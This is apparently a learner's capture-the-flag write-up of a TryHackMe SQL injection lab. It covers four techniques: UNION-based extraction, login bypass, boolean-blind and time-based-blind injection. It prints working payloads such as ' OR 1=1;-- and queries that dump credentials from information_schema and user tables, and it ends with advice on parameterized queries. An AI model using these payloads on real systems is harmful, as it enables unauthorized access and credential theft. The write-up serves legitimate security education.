## Target: TryHackMe SQL Injection Practical Lab
## Platform: TryHackME
## Date: 07/08/2026
## Difficulty: Easy
## Tools: 

### Level 1 

#### Objective 

**Extract credentials from vulnerable database**

#### **Enumerate Column Count & Make Output Visible +**

Performed column enumeration using numbers to satisfy UNION conditions 

![Find-Column-Count](Images/sqli1-findcolumns.jpeg)

Found article page returned 3 columns 

![Find-Column-Count2](Images/sqli1-findcolumn2.jpeg)

Set article id to 0 to make injected output visible 

```SQL
0 UNION SELECT 1,2,3
```
Found that 3 shows up in the pages content area, making it the column perfect for extraction 



#### **Get Database Name**

Used MYSQL function database() to extract the name of the current database for future enumeration

```SQL
0 UNION SELECT 1,2,database()
```

![Database-Enumeration](Images/sqli1-finddatabase.jpeg)



Query showed that the current database is `sqli_one`


#### **Enumerate Tables and Columns**

Enumerated the tables listed within the `sqli-one` database to find the table containing user credenetials 

- 

```SQL
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema= 'sqli_one'
```

- Used information_schema.tables (Found in MYSQL, MariaDB, PostgreSQL and showsd database table) to collect the current tables found in the database system

![Find-Tables](Images/sqli1-dumptables.jpeg)

Found table `staff_users` from the injected query output 


```SQL
0 UNION SELECT 1,2, group_concat(column_name) FROM information_schema.columns WHERE table_name='staff_users'
```

![Find-Columns](Images/sqli1-dumpcolumns.jpeg)

Found columns `id`, `password`, `username` from injected query output 


#### **Dumping Credentials**

Extracted usernames and passwords from `staff_users`

```SQL
0 UNION SELECT 1,2, group_concat(username, ':', password SEPARATOR '<br>') FROM staff_users
```

![Dump-Credentials](Images/sqli1-dumpcredentials.jpeg)

Found Martin's password 'pas$$word' from injected query output 

#### **Capture Flag**

![Flag-Capture](Images/sqli1-flag.jpeg)

---


### Level 2

#### Objective 

**Authenticate without valid credentials**

#### **Authentication Bypass**

Presented with a login form at https://website.thm/login

Entered payload 

```SQL
' OR 1=1;--
```

- Premature field closure (') does not match any user 
- `OR 1=1` always evaluates to true (returning a row)
- `;--` ends the statements and comments everything after it (password)

#### **Capture Flag**

![Auth-Bypass](Images/sqli2-authbypass.jpeg)

Login was bypassed and flag was captured 

---

### Level 3

#### Objective 

**Extract credentials using only true/false responses**

#### Enumerate Page and Confirm Injection 

Presented with checkuser API at https://website.thm/checkuser?username=admin returning {"taken":true}

![Home-Page](Images/sqli3-home.jpeg)

Attempted to confirm whether URL parameter username was injectable or not 

```SQL
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
```
Respone returned {"taken":true} confirming parameter is injectable 



#### Enumerate Database 

Attempted to get database, character by character 

![db-1](Images/sqli3-db1.jpeg)
![db-2](Images/sqli3-db2.jpeg)

Confirmed database name `sqli_three` via {"taken":true} page response 

![db-3](Images/sqli3-db3.jpeg)

#### Enumerate Tables and Columns

Queried information_schema.tables within 'sqli_three' database  to enumerate available tables (LIKE)

```SQL
UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like '%';--
```

Narrowed result down to table 'users' 
![Table-Name](Images/sqli3-usrtable.jpeg)

Extracted available columns from users through the same enumeration process

```SQL
admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' and column_name like '%';--
```

Confirmed the column `username` exists 

![user-column](Images/sqli3-usercolumn.jpeg)

Confirmed column `password` exists 

![pass-column](Images/sqli3-passcolumn.jpeg)


#### Extract Username and Password 

Repeated enumeration process for username

```SQL
UNION SELECT 1,2,3 from users where username like '%';--
```
Found `admin` username exists 
![usr-enum](Images/sqli-usrconfirm.jpeg)

Repeated process again for password 

```SQL
 UNION SELECT 1,2,3 from users where username='admin' and password like '%';--
```

Found admin password began with 3 

![pass-enum](Images/sqli3-passenum.jpeg)

Experimented with different combinations until confirmation 

![Full-Credentials](Images/sqli3-fullcreds.jpeg)

**Confirmed full credentials**
- username: admin
- password: 3845

#### Authentication & Flag Capture

Successfully authenticated using the recovered credentials

![Loggin-In](Images/sqli3-entercreds.jpeg)

#### **Capture Flag**

![Flag-Capture](Images/sqli3-flag.jpeg)

---

### Level 4 
#### Objective 

**Extract credentials using Response Timing**

Introduced to a home page, complete with a timer and Referrer HTTP header injection point 

![Home-Page](Images/sqli4-home.jpeg)

---
#### Find Column Count 

Enumerated column count using the sleep operator 

```SQL
 UNION SELECT SLEEP(5),2;--
```

![Column-Count](Images/sqli4-columncount.jpeg)



#### Get the database name 

Enumerate database character by character 

![db-enum](Images/sqli4-dbenum.jpeg)

Confirmed name of database -- `sqli_four`

![db-confirm](Images/sqli4-dbconfirm.jpeg)


#### Enumerate Tables and Columns 

Enumerated the tables character by character using the LIKE operator 

```SQL
 UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema='sqli_four' AND table_name LIKE '%';--
```

![table-enum](Images/sqli4-tableenum.jpeg)

![table-confirmed](Images/sqli4-tableconfirm.jpeg)

- Found table `users`

Repeated the same enumeration process for columns 

- Found columns `username` and `password`


#### Extract the admin password 

Iterated through and found the admin password Using the previously enumerated information 

![password-enum](Images/sqli4-passenum.jpeg)

```SQL
UNION SELECT SLEEP(3),2 FROM users where username='admin' AND password LIKE '%';--
```
![password-enum](Images/sqli4-passconfirm.jpeg)

Confirmed 

- Username: Admin
- Password: 4961


#### **Capture Flag**

![Flag](Images/sqli4-flag.jpeg)





#### Key Takeaway

This lab demonstrated how SQL injection vulnerabilities can expose sensitive information and allow for authentication to be bypassed. It emphasized the importance of properly handling user input  so that the injections displayed never come to fruition 

This lab showcased four different levels of SQL injections and techniques used 

1. Union-Based SQLi (In-band)
2. Authentication Bypass
3. Boolean-Based Blind SQLi
4. Time-Based Blind SQLi

A key insight showcased was diversity of delivery vectors for injections on a web application. 
1. GET param (URL query) -> Union-Based SQLi (In-band)\
2. POST param (login field) -> Authentication Bypass
3. GET param (checkuser API) -> Boolean-based Blind SQLi
4. HTTP header (Referrer) -> Time-Based Blind sqli

The diversity of distance vectors emphasizes that input shouldn't be defended at the entry point but rather the delivery point. Instead of trying to predict delivery vectors and stop them, it is more effective to defend the place where injections will always be delivered. When dealing with client-controlled input it is best to avoid concatenating it and use parameterization so all input is treated as data.

Paramterization allows for intended query logic to be parsed and frozen before any user input touches it. Because the structure is parsed before anything arrives, all user input is injected into the data slots.






